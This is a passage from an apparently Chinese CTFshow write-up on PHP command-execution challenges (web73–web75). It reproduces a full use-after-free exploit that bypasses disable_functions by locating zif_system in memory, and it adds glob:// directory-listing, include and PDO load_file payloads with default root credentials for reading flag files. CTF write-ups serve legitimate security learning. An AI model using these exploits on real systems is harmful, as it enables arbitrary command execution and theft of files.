class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$ret</span>++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">str_user</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_user</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">str_user</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flagc.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><p>发现还是不行，报错原因是整数溢出</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/73.png" alt=""></p><p>继续修改<code>strlen</code>的替换函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$ret</span>++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现还是由于数据长度太长，导致发送不过去，只能换个方法</p><p>最终payload：<code>c=include(&quot;/flagc.txt&quot;);exit();</code> （想不到include可以用了）</p><h1 id="web74"><a href="#web74" class="headerlink" title="web74()"></a>web74()</h1><p>先用<code>glob://</code>将文件找出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>在利用<code>include</code>将flag读取出来</p><p><code>payload: c=include(&#39;/flagx.txt&#39;);exit();</code></p><h1 id="web75-PDO"><a href="#web75-PDO" class="headerlink" title="web75(PDO)"></a>web75(PDO)</h1><p>操作同上</p><p>先用<code>glob://</code>将文件找出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>本题还通过<code>include_path</code>限制了文件包含的路径，无法直接使用<code>include</code>包含得到flag信息</p><p>这时候需要用到另一个方法，使用PDO链接，但是需要知道数据库名等信息，利用如下代码得到数据库信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>得到数据库</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/75.png" alt=""></p><p>使用<code>load_file</code>函数读取flag文件即可获取flag信息</p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span 